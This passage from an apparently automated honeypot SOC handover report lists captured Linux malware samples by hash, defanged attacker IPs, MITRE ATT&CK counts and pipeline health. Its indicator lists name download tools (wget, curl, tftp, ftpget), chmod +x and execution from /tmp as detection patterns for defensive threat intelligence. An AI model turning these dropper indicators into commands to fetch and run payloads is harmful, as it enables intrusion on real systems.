| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 41/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 55/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `182.92.236[.]135` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 3 |
| `31.41.84[.]98` | PL | Telekom System sp.z o.o. | **100** ⚠️ | 50 |
| `176.10.203[.]54` | SE | Bahnhof AB | **100** ⚠️ | 50 |
| `213.130.207[.]177` | LT | Mobile Services Lithuania | **100** ⚠️ | 50 |
| `113.193.187[.]154` | IN | Tikona Infinet Ltd. | **100** ⚠️ | 50 |
| `220.246.43[.]109` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `196.189.59[.]226` | ET | To__BRAS_DHCP_AD_10800E | **100** ⚠️ | 50 |
| `114.98.63[.]18` | CN | CHINANET Anhui PROVINCE NETWORK | **100** ⚠️ | 50 |
| `118.122.196[.]230` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `46.201.247[.]21` | UA | JSC Ukrtelecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 140 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 132 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 44 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 42 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 42 |

---

## 🔕 False Positive Summary (49 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 46 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 226 cases |
| Tool 34  | Credential Extractor        | ✅ 153 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 92 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 49 filtered (21.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 132 priority case(s) shown individually · 29 recon entry/entries in table (10 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-24T06:30:57Z_
